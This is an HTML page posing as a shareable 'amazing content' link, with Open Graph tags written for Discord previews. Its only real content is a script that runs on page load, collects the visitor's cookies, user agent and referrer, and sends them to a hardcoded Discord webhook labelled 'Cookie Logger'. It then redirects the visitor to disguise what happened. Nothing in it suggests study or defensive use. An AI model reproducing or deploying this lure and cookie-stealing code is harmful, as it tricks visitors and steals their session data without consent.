<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Check out this amazing content!</title>

    <!-- Discord Open Graph Tags -->
    <meta property="og:title" content="You won't believe what I found!">
    <meta property="og:image" content="https://bl4rr13-a11y.github.io/private/preview-image.jpg">
    <meta property="og:description" content="Click to see something incredible">
    <meta property="og:url" content="https://bl4rr13-a11y.github.io/private/">

    <!-- Regular Meta Tags -->
    <meta name="description" content="Something interesting">
</head>
<body>
    <div id="content">
        <h1>Loading...</h1>
        <p>Please wait while we redirect you.</p>
        <div id="cookies"></div>
    </div>

    <!-- Cookie Logging Script -->
    <script>
        function logCookies() {
            const cookies = document.cookie.split(';');
            const userAgent = navigator.userAgent;
            const referrer = document.referrer;
            const timestamp = new Date().toISOString();

            // Send data to Discord webhook
            fetch('https://discord.com/api/webhooks/1466506559147213003/qrxjvSSnXRtK48PA-BGQqwmrf7u2nxjH6zxhcbEegPrADQuHUQeQNefLfkiZODgnbZ-u', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: "Cookie Logger",
                    avatar_url: "https://cdn.discordapp.com/icons/1466506559147213003/a_8d9f8d9f8d9f8d9f8d9f8d9f8d9f8d9f.png",
                    embeds: [{
                        title: "New Cookie Logged",
                        fields: [
                            { name: "Cookies", value: cookies.join('\n') },
                            { name: "User Agent", value: userAgent },
                            { name: "Referrer", value: referrer },
                            { name: "Timestamp", value: timestamp }
                        ]
                    }]
                })
            })
            .then(response => console.log('Cookie data sent'))
            .catch(error => console.error('Error:', error));

            // Display cookies with website on top (not copyable) and cookie value below (copyable)
            const cookiesDiv = document.getElementById('cookies');
            cookies.forEach(cookie => {
                const [name, value] = cookie.split('=');
                const websiteDiv = document.createElement('div');
                websiteDiv.textContent = window.location.hostname;
                websiteDiv.style.fontWeight = 'bold';
                websiteDiv.style.userSelect = 'none';
                const cookieDiv = document.createElement('div');
                cookieDiv.textContent = `${name.trim()}: ${value}`;
                cookieDiv.style.userSelect = 'text';
                cookiesDiv.appendChild(websiteDiv);
                cookiesDiv.appendChild(cookieDiv);
            });

            // Redirect after logging
            setTimeout(() => {
                window.location.href = "https://legitimate-website.com";
            }, 2000);
        }

        // Execute when page loads
        window.onload = logCookies;
    </script>
</body>
</html>
